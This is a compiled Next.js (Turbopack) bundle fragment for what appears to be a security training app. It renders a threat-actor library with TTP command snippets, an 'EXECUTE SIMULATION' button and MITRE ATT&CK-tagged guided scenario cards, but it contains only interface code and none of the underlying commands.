                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                            className: "code-block",
                                            style: {
                                                background: '#000',
                                                padding: '0.5rem',
                                                fontFamily: 'monospace',
                                                fontSize: '0.8rem',
                                                color: '#0f0',
                                                marginBottom: '1rem',
                                                overflowX: 'auto'
                                            },
                                            children: ttp.commandSnippet
                                        }, void 0, false, {
                                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                                            lineNumber: 78,
                                            columnNumber: 33
                                        }, this),
                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                            style: {
                                                display: 'flex',
                                                justifyContent: 'space-between',
                                                alignItems: 'center'
                                            },
                                            children: ttp.scriptPath ? /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
                                                onClick: ()=>executeTTP(ttp),
                                                className: "btn",
                                                disabled: runningTTP === ttp.id,
                                                style: {
                                                    fontSize: '0.8rem',
                                                    padding: '0.3rem 0.8rem'
                                                },
                                                children: runningTTP === ttp.id ? 'EXECUTING...' : 'EXECUTE SIMULATION'
                                            }, void 0, false, {
                                                fileName: "[project]/src/components/ThreatLibrary.tsx",
                                                lineNumber: 92,
                                                columnNumber: 41
                                            }, this) : /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                                className: "text-dim mono",
                                                style: {
                                                    fontSize: '0.8rem'
                                                },
                                                children: "PENDING IMPLEMENTATION"
                                            }, void 0, false, {
                                                fileName: "[project]/src/components/ThreatLibrary.tsx",
                                                lineNumber: 101,
                                                columnNumber: 41
                                            }, this)
                                        }, void 0, false, {
                                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                                            lineNumber: 90,
                                            columnNumber: 33
                                        }, this),
                                        output[ttp.id] && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                            style: {
                                                marginTop: '1rem',
                                                background: '#111',
                                                padding: '0.5rem',
                                                border: '1px solid #333'
                                            },
                                            children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("pre", {
                                                style: {
                                                    margin: 0,
                                                    whiteSpace: 'pre-wrap',
                                                    fontSize: '0.8rem',
                                                    color: '#ccc'
                                                },
                                                children: output[ttp.id]
                                            }, void 0, false, {
                                                fileName: "[project]/src/components/ThreatLibrary.tsx",
                                                lineNumber: 107,
                                                columnNumber: 41
                                            }, this)
                                        }, void 0, false, {
                                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                                            lineNumber: 106,
                                            columnNumber: 37
                                        }, this)
                                    ]
                                }, ttp.id, true, {
                                    fileName: "[project]/src/components/ThreatLibrary.tsx",
                                    lineNumber: 66,
                                    columnNumber: 29
                                }, this))
                        }, void 0, false, {
                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                            lineNumber: 64,
                            columnNumber: 21
                        }, this)
                    ]
                }, void 0, true, {
                    fileName: "[project]/src/components/ThreatLibrary.tsx",
                    lineNumber: 47,
                    columnNumber: 17
                }, this)
            ]
        }, void 0, true, {
            fileName: "[project]/src/components/ThreatLibrary.tsx",
            lineNumber: 38,
            columnNumber: 13
        }, this);
    }
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
        children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
            style: {
                display: 'grid',
                gridTemplateColumns: 'repeat(auto-fill, minmax(300px, 1fr))',
                gap: '1.5rem'
            },
            children: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["THREAT_ACTORS"].map((actor)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                    className: "card",
                    style: {
                        cursor: 'pointer',
                        transition: 'transform 0.2s',
                        border: '1px solid #333'
                    },
                    onClick: ()=>setSelectedActorId(actor.id),
                    onMouseEnter: (e)=>e.currentTarget.style.borderColor = 'var(--primary)',
                    onMouseLeave: (e)=>e.currentTarget.style.borderColor = '#333',
                    children: [
                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                            style: {
                                display: 'flex',
                                justifyContent: 'space-between',
                                marginBottom: '1rem'
                            },
                            children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                className: "mono text-primary",
                                style: {
                                    fontSize: '1.2rem'
                                },
                                children: actor.name
                            }, void 0, false, {
                                fileName: "[project]/src/components/ThreatLibrary.tsx",
                                lineNumber: 137,
                                columnNumber: 29
                            }, this)
                        }, void 0, false, {
                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                            lineNumber: 136,
                            columnNumber: 25
                        }, this),
                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                            className: "text-dim",
                            style: {
                                fontSize: '0.9rem',
                                lineHeight: '1.5'
                            },
                            children: [
                                actor.description.substring(0, 100),
                                "..."
                            ]
                        }, void 0, true, {
                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                            lineNumber: 139,
                            columnNumber: 25
                        }, this),
                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                            style: {
                                marginTop: '1rem',
                                display: 'flex',
                                gap: '0.5rem'
                            },
                            children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                className: "tag",
                                children: [
                                    actor.ttps.length,
                                    " TTPs"
                                ]
                            }, void 0, true, {
                                fileName: "[project]/src/components/ThreatLibrary.tsx",
                                lineNumber: 143,
                                columnNumber: 29
                            }, this)
                        }, void 0, false, {
                            fileName: "[project]/src/components/ThreatLibrary.tsx",
                            lineNumber: 142,
                            columnNumber: 25
                        }, this)
                    ]
                }, actor.id, true, {
                    fileName: "[project]/src/components/ThreatLibrary.tsx",
                    lineNumber: 124,
                    columnNumber: 21
                }, this))
        }, void 0, false, {
            fileName: "[project]/src/components/ThreatLibrary.tsx",
            lineNumber: 122,
            columnNumber: 13
        }, this)
    }, void 0, false, {
        fileName: "[project]/src/components/ThreatLibrary.tsx",
        lineNumber: 121,
        columnNumber: 9
    }, this);
}
}),
"[project]/src/app/page.tsx [app-ssr] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "default",
    ()=>Home
]);
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/server/route-modules/app-page/vendored/ssr/react-jsx-dev-runtime.js [app-ssr] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/server/route-modules/app-page/vendored/ssr/react.js [app-ssr] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$client$2f$app$2d$dir$2f$link$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/client/app-dir/link.js [app-ssr] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/types.ts [app-ssr] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$ssr$5d$__$28$css__module$29$__ = __turbopack_context__.i("[project]/src/app/page.module.css [app-ssr] (css module)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ThreatLibrary$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/components/ThreatLibrary.tsx [app-ssr] (ecmascript)");
'use client';
;
;
;
;
;
;
function Home() {
    const [activeTab, setActiveTab] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["useState"])('threats');
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("main", {
        className: "container",
        children: [
            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                style: {
                    display: 'flex',
                    gap: '2rem',
                    marginBottom: '2rem',
                    borderBottom: '1px solid #333',
                    paddingBottom: '1rem'
                },
                children: [
                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
                        onClick: ()=>setActiveTab('threats'),
                        className: "mono",
                        style: {
                            background: 'none',
                            border: 'none',
                            color: activeTab === 'threats' ? 'var(--primary)' : '#666',
                            fontSize: '1.2rem',
                            cursor: 'pointer',
                            padding: '0.5rem 0',
                            borderBottom: activeTab === 'threats' ? '2px solid var(--primary)' : '2px solid transparent',
                            transition: 'all 0.2s'
                        },
                        children: "THREAT LIBRARY"
                    }, void 0, false, {
                        fileName: "[project]/src/app/page.tsx",
                        lineNumber: 21,
                        columnNumber: 9
                    }, this),
                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
                        onClick: ()=>setActiveTab('scenarios'),
                        className: "mono",
                        style: {
                            background: 'none',
                            border: 'none',
                            color: activeTab === 'scenarios' ? 'var(--primary)' : '#666',
                            fontSize: '1.2rem',
                            cursor: 'pointer',
                            padding: '0.5rem 0',
                            borderBottom: activeTab === 'scenarios' ? '2px solid var(--primary)' : '2px solid transparent',
                            transition: 'all 0.2s'
                        },
                        children: "GUIDED SCENARIOS"
                    }, void 0, false, {
                        fileName: "[project]/src/app/page.tsx",
                        lineNumber: 37,
                        columnNumber: 9
                    }, this)
                ]
            }, void 0, true, {
                fileName: "[project]/src/app/page.tsx",
                lineNumber: 14,
                columnNumber: 7
            }, this),
            activeTab === 'threats' ? /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ThreatLibrary$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["default"], {}, void 0, false, {
                fileName: "[project]/src/app/page.tsx",
                lineNumber: 56,
                columnNumber: 9
            }, this) : /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("section", {
                className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$ssr$5d$__$28$css__module$29$__["default"].scenariosGrid,
                children: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["SCENARIOS"].map((scenario)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                        className: "card",
                        children: [
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                style: {
                                    display: 'flex',
                                    justifyContent: 'space-between',
                                    alignItems: 'start',
                                    marginBottom: '1rem'
                                },
                                children: [
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                        className: `mono ${__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$ssr$5d$__$28$css__module$29$__["default"].badge}`,
                                        children: scenario.adversary
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/page.tsx",
                                        lineNumber: 62,
                                        columnNumber: 17
                                    }, this),
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                        className: "text-dim mono",
                                        style: {
                                            fontSize: '0.8rem'
                                        },
                                        children: scenario.difficulty
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/page.tsx",
                                        lineNumber: 63,
                                        columnNumber: 17
                                    }, this)
                                ]
                            }, void 0, true, {
                                fileName: "[project]/src/app/page.tsx",
                                lineNumber: 61,
                                columnNumber: 15
                            }, this),
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("h2", {
                                className: "mono text-primary",
                                style: {
                                    fontSize: '1.25rem',
                                    marginBottom: '0.5rem'
                                },
                                children: scenario.name
                            }, void 0, false, {
                                fileName: "[project]/src/app/page.tsx",
                                lineNumber: 66,
                                columnNumber: 15
                            }, this),
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                                className: "text-dim",
                                style: {
                                    fontSize: '0.9rem',
                                    marginBottom: '1.5rem',
                                    lineHeight: '1.6'
                                },
                                children: scenario.description
                            }, void 0, false, {
                                fileName: "[project]/src/app/page.tsx",
                                lineNumber: 69,
                                columnNumber: 15
                            }, this),
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                style: {
                                    marginBottom: '1.5rem'
                                },
                                children: [
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                                        className: "mono text-dim",
                                        style: {
                                            fontSize: '0.75rem',
                                            marginBottom: '0.5rem'
                                        },
                                        children: "MITRE ATT&CK:"
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/page.tsx",
                                        lineNumber: 74,
                                        columnNumber: 17
                                    }, this),
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                        style: {
                                            display: 'flex',
                                            gap: '0.5rem',
                                            flexWrap: 'wrap'
                                        },
                                        children: scenario.mitreTechniques.map((tech)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                                className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$ssr$5d$__$28$css__module$29$__["default"].tag,
                                                title: tech.name,
                                                children: tech.id
                                            }, tech.id, false, {
                                                fileName: "[project]/src/app/page.tsx",
                                                lineNumber: 77,
                                                columnNumber: 21
                                            }, this))
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/page.tsx",
                                        lineNumber: 75,
                                        columnNumber: 17
                                    }, this)
                                ]
                            }, void 0, true, {
                                fileName: "[project]/src/app/page.tsx",
                                lineNumber: 73,
                                columnNumber: 15
                            }, this),
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$client$2f$app$2d$dir$2f$link$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["default"], {
                                href: `/scenario/${scenario.id}`,
                                className: "btn",
                                style: {
                                    display: 'block',
                                    textAlign: 'center',
                                    textDecoration: 'none'
                                },
                                children: "INITIALIZE"
                            }, void 0, false, {
                                fileName: "[project]/src/app/page.tsx",
                                lineNumber: 84,
                                columnNumber: 15
                            }, this)
                        ]
                    }, scenario.id, true, {
                        fileName: "[project]/src/app/page.tsx",
                        lineNumber: 60,
                        columnNumber: 13
                    }, this))
            }, void 0, false, {
                fileName: "[project]/src/app/page.tsx",
                lineNumber: 58,
                columnNumber: 9
            }, this)
        ]
    }, void 0, true, {
        fileName: "[project]/src/app/page.tsx",
        lineNumber: 13,
        columnNumber: 5
    }, this);
}
}),
];

//# sourceMappingURL=src_bfeb3b9a._.js.map